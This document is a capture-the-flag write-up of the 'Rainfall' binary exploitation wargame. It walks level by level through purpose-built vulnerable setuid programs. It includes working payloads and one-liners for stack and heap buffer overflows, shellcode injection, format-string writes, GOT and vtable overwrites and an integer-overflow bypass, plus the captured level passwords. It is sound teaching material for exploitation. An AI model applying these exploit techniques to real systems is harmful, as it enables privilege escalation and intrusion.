# Rainfall

## level0

After port forwarding the port 4242 to 24242 on the host, we login to the VM and get greeted by this screen:

```
ssh -p 24242 level0@localhost
          _____       _       ______    _ _ 
         |  __ \     (_)     |  ____|  | | |
         | |__) |__ _ _ _ __ | |__ __ _| | |
         |  _  /  _` | | '_ \|  __/ _` | | |
         | | \ \ (_| | | | | | | | (_| | | |
         |_|  \_\__,_|_|_| |_|_|  \__,_|_|_|

                 Good luck & Have fun

  To start, ssh with level0/level0 on 10.0.2.15:4242
level0@localhost's password: 
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   /home/user/level0/level
```

For the most part, it means that exploitation will be as easy as possible:
- addresses will not be randomized
- buffer overflows will not be protected
- no section will be marked as non-executable, allowing us to create shellcodes

```console
level0@RainFall:~$ ls -al
total 737
dr-xr-x---+ 1 level0 level0     60 Mar  6  2016 .
dr-x--x--x  1 root   root      340 Sep 23  2015 ..
-rw-r--r--  1 level0 level0    220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level0 level0   3530 Sep 23  2015 .bashrc
-rwsr-x---+ 1 level1 users  747441 Mar  6  2016 level0
-rw-r--r--  1 level0 level0    675 Apr  3  2012 .profile
```

There is a single executable with the setuid bit on, meaning that the executable will be run with the permissions of the next level. This is the pattern for all levels. We will hop from user `level0` to `level9`, then `bonus0` to `bonus3`. The challenge will be completed when we reach the `end` user.

```nasm
(gdb) disas main
Dump of assembler code for function main:
   0x08048ec0 <+0>:     push   ebp
   0x08048ec1 <+1>:     mov    ebp,esp
   0x08048ec3 <+3>:     and    esp,0xfffffff0
   0x08048ec6 <+6>:     sub    esp,0x20
   0x08048ec9 <+9>:     mov    eax,DWORD PTR [ebp+0xc]
   0x08048ecc <+12>:    add    eax,0x4
   0x08048ecf <+15>:    mov    eax,DWORD PTR [eax]
   0x08048ed1 <+17>:    mov    DWORD PTR [esp],eax
   0x08048ed4 <+20>:    call   0x8049710 <atoi>
   0x08048ed9 <+25>:    cmp    eax,0x1a7
   0x08048ede <+30>:    jne    0x8048f58 <main+152>
   0x08048ee0 <+32>:    mov    DWORD PTR [esp],0x80c5348
   0x08048ee7 <+39>:    call   0x8050bf0 <strdup>
   0x08048eec <+44>:    mov    DWORD PTR [esp+0x10],eax
   0x08048ef0 <+48>:    mov    DWORD PTR [esp+0x14],0x0
   0x08048ef8 <+56>:    call   0x8054680 <getegid>
   0x08048efd <+61>:    mov    DWORD PTR [esp+0x1c],eax
   0x08048f01 <+65>:    call   0x8054670 <geteuid>
   0x08048f06 <+70>:    mov    DWORD PTR [esp+0x18],eax
   0x08048f0a <+74>:    mov    eax,DWORD PTR [esp+0x1c]
   0x08048f0e <+78>:    mov    DWORD PTR [esp+0x8],eax
   0x08048f12 <+82>:    mov    eax,DWORD PTR [esp+0x1c]
   0x08048f16 <+86>:    mov    DWORD PTR [esp+0x4],eax
   0x08048f1a <+90>:    mov    eax,DWORD PTR [esp+0x1c]
   0x08048f1e <+94>:    mov    DWORD PTR [esp],eax
   0x08048f21 <+97>:    call   0x8054700 <setresgid>
   0x08048f26 <+102>:   mov    eax,DWORD PTR [esp+0x18]
   0x08048f2a <+106>:   mov    DWORD PTR [esp+0x8],eax
   0x08048f2e <+110>:   mov    eax,DWORD PTR [esp+0x18]
   0x08048f32 <+114>:   mov    DWORD PTR [esp+0x4],eax
   0x08048f36 <+118>:   mov    eax,DWORD PTR [esp+0x18]
   0x08048f3a <+122>:   mov    DWORD PTR [esp],eax
   0x08048f3d <+125>:   call   0x8054690 <setresuid>
   0x08048f42 <+130>:   lea    eax,[esp+0x10]
   0x08048f46 <+134>:   mov    DWORD PTR [esp+0x4],eax
   0x08048f4a <+138>:   mov    DWORD PTR [esp],0x80c5348
   0x08048f51 <+145>:   call   0x8054640 <execv>
   0x08048f56 <+150>:   jmp    0x8048f80 <main+192>
   0x08048f58 <+152>:   mov    eax,ds:0x80ee170
   0x08048f5d <+157>:   mov    edx,eax
   0x08048f5f <+159>:   mov    eax,0x80c5350
   0x08048f64 <+164>:   mov    DWORD PTR [esp+0xc],edx
   0x08048f68 <+168>:   mov    DWORD PTR [esp+0x8],0x5
   0x08048f70 <+176>:   mov    DWORD PTR [esp+0x4],0x1
   0x08048f78 <+184>:   mov    DWORD PTR [esp],eax
   0x08048f7b <+187>:   call   0x804a230 <fwrite>
   0x08048f80 <+192>:   mov    eax,0x0
   0x08048f85 <+197>:   leave  
   0x08048f86 <+198>:   ret    
End of assembler dump.
(gdb) x/s 0x80c5350
0x80c5350:       "No !\n"
(gdb) x/s 0x80c5348
0x80c5348:       "/bin/sh"
```

Decompiled, this looks like this:

```c
int main(int argc, char** argv) {
    if (atoi(argv[1]) == 423) {
        char* exec_argv[2] = {strdup("/bin/sh"), NULL};

        gid_t egid = getegid();
        uid_t euid = geteuid();

        setresgid(egid, egid, egid);
        setresuid(euid, euid, euid);

        execv("/bin/sh", exec_argv);
    } else {
        fwrite("No !\n", 1, 5, stdout);
    }

    return 0;
}
```

The program checks if `argv[1]` has the correct value (0x1a7 = 423), and executes a shell with elevated privileges.

```console
level0@RainFall:~$ ./level0 777
No !
level0@RainFall:~$ ./level0 423
$ cat /home/user/level1/.pass
1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a
```


## level1

This is a very short program that seems to only call `gets`.

```nasm
(gdb) disas main
Dump of assembler code for function main:
   0x08048480 <+0>:     push   ebp
   0x08048481 <+1>:     mov    ebp,esp
   0x08048483 <+3>:     and    esp,0xfffffff0
   0x08048486 <+6>:     sub    esp,0x50
   0x08048489 <+9>:     lea    eax,[esp+0x10]
   0x0804848d <+13>:    mov    DWORD PTR [esp],eax
   0x08048490 <+16>:    call   0x8048340 <gets@plt>
   0x08048495 <+21>:    leave  
   0x08048496 <+22>:    ret    
End of assembler dump.
```

The man page of `gets` says the following:

```
BUGS
       Never  use  gets().   Because  it is impossible to tell without knowing the
       data in advance how many characters gets() will read,  and  because  gets()
       will  continue  to  store  characters past the end of the buffer, it is ex‐
       tremely dangerous to use.  It has been used  to  break  computer  security.
       Use fgets() instead.
```

There is another function called `run` that opens a shell with the permissions of the next level.

```
(gdb) p run
$1 = {<text variable, no debug info>} 0x8048444 <run>
```

Decompiled with Ghidra, the full program looks like this:

```c
void run() {
    fwrite("Good... Wait what?\n", 1, 19, stdout);
    system("/bin/sh");
}

int main() {
    char buf[64];
    gets(buf);
}
```

Our goal is to overwrite the return address of `main` so that it jumps to `run` insteads of exiting the program.

The layout of the stack before calling `gets` is:
- return address (4 bytes)
- base pointer (4 bytes)
- unused bytes due to alignment (8 bytes)
- buffer (64 bytes)

With a Python one-liner, we provide 76 garbage values, then the address of `run` in little endian. We call `cat` to keep stdin of `level1`, allowing us to use the shell.

```
level1@RainFall:~$ (python -c 'print("w" * 76 + "\x44\x84\x04\x08")'; cat) | ./level1
Good... Wait what?
$ cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```


## level2

We are once again face to face with a `gets` vulnerability.

```c
void p() {
    char buf[64];
    unsigned int ret_addr;

    fflush(stdout);
    gets(buf);

    ret_addr = (unsigned int)__builtin_return_address(0);
    if ((ret_addr & 0xb0000000) == 0xb0000000) {
        printf("(%p)\n", (const void*)ret_addr);
        _exit(1);
    }

    puts(buf);
    strdup(buf);
}

int main() { p(); }
```

The previous level provided us with a helper function running a shell, but we have no such luck this time.

We can write custom machine code to a buffer then jump to this buffer to execute it. This code is usually just a call to `execve("/bin/sh", 0, 0)`. Thus the name: **shellcode**.

A shellcode exploit has this structure:
- actual shellcode
- padding to align the address we'll write to the saved return address
- address of the start of the shellcode

This level makes it a bit harder by checking if the address is in the range `0xb0000000` -> `0xffffffff`, which contains the stack. Luckily the buffer is duplicated on the heap with `strdup` right after.

```nasm
(gdb) set disassembly-flavor intel
(gdb) set pagination off
(gdb) disas main
Dump of assembler code for function main:
   0x0804853f <+0>:     push   ebp
   0x08048540 <+1>:     mov    ebp,esp
   0x08048542 <+3>:     and    esp,0xfffffff0
   0x08048545 <+6>:     call   0x80484d4 <p>
   0x0804854a <+11>:    leave  
   0x0804854b <+12>:    ret    
End of assembler dump.
(gdb) disas p
Dump of assembler code for function p:
[...]
   0x08048538 <+100>:   call   0x80483e0 <strdup@plt>
   0x0804853d <+105>:   leave  
   0x0804853e <+106>:   ret    
End of assembler dump.
(gdb) b *0x0804853d
Breakpoint 1 at 0x804853d
(gdb) run
Starting program: /home/user/level2/level2 
lol
lol

Breakpoint 1, 0x0804853d in p ()
(gdb) info reg eax
eax            0x804a008        134520840
```

The address of our shellcode will be 0x804a008, a value on the heap, which avoids the stack check.

```
[ebp-0x4c] ... [ebp-0x0d] → buf[64]
[ebp-0x0c]                → ret_addr (4 bytes)
[ebp-0x08] ... [ebp-0x04] → alignment, unused (8 bytes)
[ebp+0x00]                → saved EBP (4 bytes)
[ebp+0x04]                → real return address
```

The script [level2.py](./level2/resources/level2.py) prints the full exploit.

```console
level2@RainFall:~$ (python /tmp/level2.py ; cat) | ./level2 
1�P
   h//shh/bin��1�1�̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
whoami
level3
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

## level3

```c
int m;

void v() {
    char buf[520];

    fgets(buf, 512, stdin);
    printf(buf);
    if (m == 64) {
        fwrite("Wait what?!\n", 1, 12, stdout);
        system("/bin/sh");
    }
}

int main() { v(); }
```

```nasm
(gdb) disas v
Dump of assembler code for function v:
[...]
   0x080484da <+54>:    mov    eax,ds:0x804988c
   0x080484df <+59>:    cmp    eax,0x40
   0x080484e2 <+62>:    jne    0x8048518 <v+116>
[...]  
End of assembler dump.
```

We have to write 64 at the address 0x0804988c to get the shell.

The program uses `printf` with the input directly as a format string. This is a well-known vulnerability, since users can write their own format specifiers, causing the leak of information, or in our case, writing values directly to memory.

The `%n` format specifier in `printf` writes the number of character written so far to a variable. `printf("lol%n", &c)` will write make `c = 3`.

First, we need to detect where is the string given to `printf` on the stack:

```console
level3@RainFall:~$ echo '%x %x %x %x %x' | ./level3
200 b7fd1ac0 b7ff37d0 25207825 78252078
```

There are 3 values, then `257820` repeating corresponding to `%x `. So it is found at the 4th position.

The trick is to start the format string with the address we want to overwrite, then set %n the 4th format specifier. The rest are padding characters to reach a value of 64.

```console
level3@RainFall:~$ (python -c "print('\x8c\x98\x04\x08%x%x%x.........................................%n')" ; cat) | ./level3
�200.b7fd1ac0.b7ff37d0.......................................
Wait what?!
cat /home/user/level4/.pass                                     
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```



## level4

This program is similar to the previous one, but the value we must write is much bigger: 16930116

```c
int m;

int p(char* format) { return printf(format); }

void n() {
    char s[520];
    fgets(s, 512, stdin);
    p(s);
    if (m == 16930116) system("/bin/cat /home/user/level5/.pass");
}

int main() { n(); }
```

We find the address with `objdump`:

```console
level4@RainFall:~$ objdump -t level4 | grep m
[...]
08049810 g     O .bss   00000004              m
[...]
```

There are 10 values, then `2578` repeating corresponding to the content of the format string.

```console
level4@RainFall:~$ echo '%x%x%x%x%x%x%x%x%x%x%x%x%x' | ./level4
b7ff26b0bffff794b7fd0ff400bffff758804848dbffff550200b7fd1ac0b7ff37d07825782578257825
```

Using the precision and width modifiers, we can write the exact number of chars that we require. The full payload is:
- address we want to overwrite (in little-endian)
- 10 times `%.0s` to skip the stack until the start of the format string, while writing no character.
- 16930112 (16930116 - the 4 we've written for the address) characters with `%16930112s`
- `%n` to write the result

```console
level4@RainFall:~$ python -c "print('\x10\x98\x04\x08%.0s%.0s%.0s%.0s%.0s%.0s%.0s%.0s%.0s%.0s%16930112s%n')" | ./level4
...
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```

## level5

Once again, the vulnerability is caused by a user string being used directly as the format string in `printf`. We'll try to use it to override the address of `exit` with the address of `o`.

```c
void o() {
    system("/bin/sh");
    _exit(1);
}

void n() {
    char s[520];

    fgets(s, 512, stdin);
    printf(s);
    exit(1);
}

int main() { n(); }
```

The Global Offset Table (GOT) is a table of addresses of the locations in memory of the libc functions. `exit@got`, for example, will contain the address of `exit` in memory. If the address is empty, the dynamic linker will be used to get the function address.


We can find the address of `exit@got` by decompiling `exit`/`exit@plt`.

```
(gdb) info function exit
All functions matching regular expression "exit":

Non-debugging symbols:
[...]
0x080483d0  exit
0x080483d0  exit@plt
[...]
(gdb) disassemble 0x080483d0
Dump of assembler code for function exit@plt:
   0x080483d0 <+0>:     jmp    *0x8049838
   0x080483d6 <+6>:     push   $0x28
   0x080483db <+11>:    jmp    0x8048370
End of assembler dump.
```

We'll also need the address of `o`:

```
(gdb) p o
$4 = {<text variable, no debug info>} 0x80484a4 <o>
```

We then write a probe to find the address of the format string on the stack.

```console
level5@RainFall:~$ python -c 'print("%x " * 10)' | ./level5
200 b7fd1ac0 b7ff37d0 25207825 78252078 20782520 25207825 78252078 20782520 25207825 
```

To recapitulate:
- o = 0x080484a4 = 134513828 = (2052 << 16) | 33956
- exit@got = 0x08049838
- the format string is at the 4th place on the stack

We can then create a complete payload, similarly to the previous level, but with the added trick of using `%hn` to split the number of characters to write (~134 million) in two much smaller values.

The full payload is:
- exit@got low
- exit@got high
- 2052 - 8 = 2044 padding chars
- %4$hn : write 2052 to 4th argument (actually start of format string)
- 33956 - 2052 = 31904 padding chars
- %5$hn : write 33956 to 5th argument (actually start of format string + 4)

```console
level5@RainFall:~$ (python -c 'print("\x3a\x98\x04\x08\x38\x98\x04\x08%2044d%4$hn%31904d%5$hn")' ; cat) | ./level5
[...]
whoami
level6
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```


## level6

This level is a toy introduction to heap overflows. We want to change the value of `fn_ptr` from `m` to `n`.

```c
void n() { system("/bin/cat /home/user/level7/.pass"); }

void m() { puts("Nope"); }

int main(int argc, char** argv) {
    char* dst = malloc(64);
    void (**fn_ptr)() = malloc(4);

    *fn_ptr = m;
    strcpy(dst, argv[1]);
    (*fn_ptr)();
}
```

`strcpy` copies until it finds a null terminator, so it is very vulnerable to buffer overflows.

The payload is simply 72 chars of padding (64 for dst + 8 for malloc metadata), followed by the address of `n` in little-endian.

```console
$ objdump -t level6 | grep n
08048454 g     F .text  00000014              n
$ ./level6 $(python -c 'print("A" * 64 + "\x54\x84\x04\x08")')
Nope
$ ./level6 $(python -c 'print("A" * 68 + "\x54\x84\x04\x08")')
Segmentation fault (core dumped)
$ ./level6 $(python -c 'print("A" * 72 + "\x54\x84\x04\x08")')
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
$ ./level6 $(python -c 'print("A" * 76 + "\x54\x84\x04\x08")')
Segmentation fault (core dumped)
```

An even simpler solution, which doesn't require calculating any padding, is to spam the address of `n`, which will overwrite `fn_ptr` (and many other things).

```console
level6@RainFall:~$ ./level6 $(python -c 'print("\x54\x84\x04\x08" * 99)')
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```


## level7

This level uses ideas from the two previous ones. We'll use a heap overflow to overwrite the GOT.

```c
char c[68];

typedef struct item_t {
    int id;
    char* buf;
} item_t;

void m() {
    printf("%s - %d\n", c, (int)time(NULL));
    return;
}

int main(int argc, char** argv) {
    item_t* item1 = malloc(sizeof(item_t));
    item1->id = 1;
    item1->buf = malloc(8);

    item_t* item2 = malloc(sizeof(item_t));
    item2->id = 2;
    item2->buf = malloc(8);

    strcpy(item1->buf, argv[1]);
    strcpy(item2->buf, argv[2]);

    FILE* stream = fopen("/home/user/level8/.pass", "r");
    fgets(c, 68, stream);

    puts("~~");
    return 0;
}
```

We need to call `m` after `fgets`, so that the file has been written to the global variable `c`. We'll overwrite the address of `puts@got`.

```console
(gdb) p m
$1 = {<text variable, no debug info>} 0x80484f4 <m>
(gdb) i fun puts  
All functions matching regular expression "puts":

Non-debugging symbols:
0x08048400  puts
0x08048400  puts@plt
[...]
(gdb) x/i 0x08048400
   0x8048400 <puts@plt>:        jmp    DWORD PTR ds:0x8049928
```

With the first argument, we can change the address of `item2->buf` to point to `puts@got`. We first need 20 bytes of padding. (8 for `item1->buf` + 8 for `malloc` metadata + 4 for `item2->id`)

With the second argument, we overwrite the GOT with the address of `m`.

```console
level7@RainFall:~$ ./level7 $(python -c 'print("A" * 20 + "\x28\x99\x04\x08")') $(python -c 'print("\xf4\x84\x04\x08")')
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1765095212
```


## level8

https://dogbolt.org provides 11 different disassembly tools, and the output of Hex-Rays was by far the best for this level. With a bit of cleaning we get this:

```c
char* auth;
char* service;

int main() {
    char buf[128];

    while (true) {
        printf("%p, %p \n", auth, service);
        if (!fgets(buf, 128, stdin)) break;
        if (!strncmp(buf, "auth ", 5)) {
            auth = malloc(4);
            auth[0] = 0;
            if (strlen(buf + 5) <= 30) strcpy(auth, buf + 5);
        }
        if (!strncmp(buf, "reset", 5)) free(auth);
        if (!strncmp(buf, "service", 6)) service = strdup(buf + 7);
        if (!strncmp(buf, "login", 5)) {
            if (auth[32]) {
                system("/bin/sh");
            } else {
                fwrite("Password:\n", 1, 10, stdout);
            }
        }
    }
    return 0;
}
```

Working backwards, we see that we need `auth[32]` to contain a value, but `auth` is supposed to be only 4 characters long. It will read byte 20 of the next allocation, which we can create with `service` and a sufficiently long padding.

```console
level8@RainFall:~$ ./level8 
(nil), (nil) 
auth axel
0x804a008, (nil) 
service!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
0x804a008, 0x804a018 
login
$ whoami
level9
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```


## level9

This is the first C++ level.

```cpp

class N {
  public:
    N(int value) : _value(value) {}

    void setAnnotation(const char* text) {
        std::memcpy(_annotation, text, std::strlen(text));
    }

    int operator+(const N& other) { return this->_value + other._value; }
    int operator-(const N& other) { return this->_value - other._value; }

    // at least one virtual method

  private:
    // 4 bytes here for the vtable
    char _annotation[100];
    int _value;
};

int main(int argc, char** argv) {
    if (argc < 2) std::exit(1);

    N* a = new N(5);
    N* b = new N(6);

    a->setAnnotation(argv[1]);
    return *b + *a;
}
```

A buffer overflow is available through `memcpy`, since the length of `text` is not checked. We'll use

> In computer programming, a virtual method table (VMT), virtual function table, virtual call table, dispatch table, vtable, or vftable is a mechanism used in a programming language to support dynamic dispatch (or run-time method binding).
> Whenever a class defines a virtual function (or method), most compilers add a hidden member variable to the class that points to an array of pointers to (virtual) functions called the virtual method table. These pointers are used at runtime to invoke the appropriate function implementations, because at compile time it may not yet be known if the base function is to be called or a derived one implemented by a class that inherits from the base class. 
> -- https://en.wikipedia.org/wiki/Virtual_method_table

This part of the assembly shows the use of a vtable. First we get `b`, then its first element (which is the vtable for classes with at least one virtual method) is read, then the first function of the vtable is called.

```nasm
   0x0804867c <+136>:   mov    eax,DWORD PTR [esp+0x10]
   0x08048680 <+140>:   mov    eax,DWORD PTR [eax]
   0x08048682 <+142>:   mov    edx,DWORD PTR [eax]
[...]
   0x08048693 <+159>:   call   edx
```

We want to override the first entry of b's vtable. To do so, we'll write a shellcode in `a->_annotation`

```
(gdb) p/x *(void **)( $esp + 0x14 )
$1 = 0x804a008
```

`a` = 0x0804a008
`a->_annotation` = 0x0804a00c
`a->_annotation + 4` (address of the shellcode) = 0x0804a010

The payload written in `a->_annotation`:
- address of the shellcode
- shellcode
- padding to reach `b`'s vtable
- address of `a->_annotation`

On the next line, `*b + *a` is going to be executed. It will jump to `a->_annotation` instead of `b`'s vtable, then when our fake vtable will point to the shellcode, which is going to be executed.

```console
level9@RainFall:~$ ./level9 $(python /tmp/level9.py)
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```


## bonus0

We want to get a stack buffer overflow to overwrite the return address of `main` and jump to a shellcode.

```c
int main() {
    char buf[42];

    pp(buf);
    puts(buf);
    return 0;
}
```

We thus wants to puts more than 42 characters in the buffer, let's look at the `pp` function:

```c
void pp(char* dest) {
    char s1[20];
    char s2[20];

    p(s1, " - ");
    p(s2, " - ");
    strcpy(dest, s1);

    size_t len = strlen(dest);
    dest[len] = ' ';
    dest[len + 1] = '\0';
    strcat(dest, s2);
}
```

We see that a function called `p` is used to set the buffers `s1` and `s2`.
Let's look at it.

```c
void p(char* dest, char* s) {
    char buf[4096];

    puts(s);
    read(STDIN_FILENO, buf, 4096);
    *strchr(buf, '\n') = '\0';
    strncpy(dest, buf, 20);
}
```

We see that we can put 20 arbitrary bytes into `buf`.
Meaning we can have a non-null terminated `s1` or `s2`, by setting them to 20 non-null bytes.

By having a non-null terminated `s1`:
- The call to `strcpy` will copy `s1` to `dest`, then `s2` to `dest` (`s1` and `s2` are continous on the stack)
- Then, `dest` will be concatenated with `s2`

`dest` will therefore looks like this at the end of `pp`:
```
[s1 (20 bytes)][s2 (at most 19 bytes)][s2 (at most 19 bytes)]
```

By putting a 23 bytes shellcode in (`s1` + `s2`), and the address of the `dest` buffer somewhere in `s2`, we can overwrite the return address of `main` to jump to our shellcode.

With the shell given by our shellcode, we then retrieve the flag.

```console
bonus0@RainFall:~$ bash /tmp/bonus0.sh
 - 
 - 
1�P
   h//shh/bin��1�1�̀AAAAAAAAAAA&���A �̀AAAAAAAAAAA&���A
whoami
bonus1
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```

## bonus1

This challenge hinges on signed integer conversion: `atoi` allows negative values, so the `n > 9` check can be bypassed while still giving `memcpy` a size big enough to overflow the buffer into `n` itself.

We'd like to set `n = 44 / 4 = 11`, but the check forbids it. The trick then is to set n = `11 - 2**30`. When it is multiplied by 4, `2**30` becomes `2**32` which overflows, and we are left with 44 bytes copied.

```c
int main(int argc, const char** argv, const char** envp) {
    char dest[40];
    int n = atoi(argv[1]);
    if (n > 9) return EXIT_FAILURE;
    memcpy(dest, argv[2], 4 * n);
    printf("%d\n", n);
    if (n == 0x574f4c46) execl("/bin/sh", "sh", NULL);
    return EXIT_SUCCESS;
}
```

```console
bonus1@RainFall:~$ bc <<< 11-2^30 
-1073741813
bonus1@RainFall:~$ echo -e '\x57\x4f\x4c\x46' | rev
FLOW
bonus1@RainFall:~$ ./bonus1 -1073741813 FLOWFLOWFLOWFLOWFLOWFLOWFLOWFLOWFLOWFLOWFLOW
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```


## bonus2

We want to use a stack buffer overflow to overwrite the return address of `greetuser` to jump to a shellcode.

We will set the environment variable `LANG=nl` to be in the case `lang == 2` in the `greetuser` function.

In the `greetuser` function, the buffer `msg` is concatenated with `user.firstname`:
```c
void greetuser(t_user user) {
    char msg[64];

    switch (lang) {
    case 1: strcpy(msg, "Hyvää päivää "); break;
    case 2: strcpy(msg, "Goedemiddag! "); break;
    case 0: strcpy(msg, "Hello "); break;
    }
    strcat(msg, user.firstname);
    puts(msg);
}
```

`t_user` is a struct containing two buffers:
```c
typedef struct s_user {
    char firstname[40];
    char surname[32];
} t_user;
```

`user.firstname` and `user.surname` are set in `main`:
```c
int main(int argc, char* argv[]) {
    char* env_lang;
    t_user user;

    if (argc != 3) return 1;
    memset(&user, 0, sizeof(t_user));
    strncpy(user.firstname, argv[1], 40);
    strncpy(user.surname, argv[2], 32);
    env_lang = getenv("LANG");
    if (env_lang) {
        if (memcmp(env_lang, "fi", 2) == 0)
            lang = 1;
        else if (memcmp(env_lang, "nl", 2) == 0)
            lang = 2;
    }
    greetuser(user);
}
```

We can see that we can fill `user.firstname` with arbitrary characters.
By filling it with 40 non-null characters, the content of `msg` after `strcat(msg, user.firstname);` in the `greetuser` function is as follows:
```
"Goedemiddag! " + user.firstname + user.surname
```

We can therefore write (13 + 40 + 32) = 85 bytes to `msg`.
It is enough to overwrite the return address of `greetuser`, located at the address (msg + 76).

We can thus write our shellcode at the beginning of `argv[1]` and overwrite the return address of `greetuser` with `argv[1]` to jump to our shellcode.

Our payload:
```bash
ARGV1 := shellcode (23 bytes) + filler (17 non-zero bytes)
ARGV2 := filler ((76 - 40 - 13) = 23 bytes) + 0xbffff670 (address of argv[1], 4 bytes)
./bonus2 "${ARGV1}" "${ARGV2}"
```

This gives us a shell, which we can use to retrieve the flag.


## bonus3

```c
int main(int argc, const char** argv) {
    char buf[132];
    FILE* file = fopen("/home/user/end/.pass", "r");
    memset(buf, 0, sizeof(buf));
    if (!file || argc != 2) return -1;

    fread(buf, 1, 66, file);
    buf[65] = 0;
    buf[atoi(argv[1])] = 0;
    fread(&buf[66], 1, 65, file);
    fclose(file);
    if (!strcmp(buf, argv[1]))
        execl("/bin/sh", "sh", 0);
    else
        puts(&buf[66]);
    return 0;
}
```

Because `atoi("")` returns 0, the program sets `buf[0] = 0`, effectively forcing the first half of the buffer to become an empty string. Since `strcmp(buf, argv[1])` then compares `""` to `""`, the check succeeds, dropping us straight into the shell.

```console
bonus3@RainFall:~$ ./bonus3 ''
$ cat /home/user/end/.pass
3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
```


